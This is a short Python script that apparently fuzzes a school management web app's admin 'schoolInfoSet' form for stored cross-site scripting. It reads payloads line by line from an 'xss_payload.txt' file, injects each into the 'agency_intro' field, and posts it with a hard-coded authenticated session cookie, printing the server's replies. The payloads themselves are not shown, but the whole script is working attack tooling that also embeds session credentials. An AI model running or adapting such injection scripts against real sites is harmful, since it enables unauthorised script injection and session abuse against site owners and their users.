import requests

URL = "http://dhfschool.test.com/admin/index.php?app=classroom&mod=User&act=schoolInfoSet"

COOKIE = "el_TSV3_LOGGED_USER=R1Tp3eU3Aj-%3DP0q8OqUaAZTVvf-FyvPfN; PHPSESSID=dtm8087j067666jbuudseftbev"
COOKIE_DICT = cookie_dict = {i.split("=")[0]:i.split("=")[-1] for i in COOKIE.split("; ")}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}



def get_data(payload):
    data = "data[agency_intro]={}&data[agency_name]=123aa".format(payload)
    return data


def get_payload(filepath):
    with open(filepath,"r",encoding="UTF-8") as f:
        line = f.readline()
        while line is not None and line != "":
            data = get_data(line.replace("\n",""))
            print(line.replace("\n","--"),end="")
            print(get_request(data))
            line = f.readline()

def get_request(data):
    try:
        r = requests.post(url=URL,data=data,cookies=COOKIE_DICT,headers=headers)
        return r.text
    except Exception as  e:
        print(e)

if __name__ == "__main__":
    filepath = "xss_payload.txt"
    get_payload(filepath)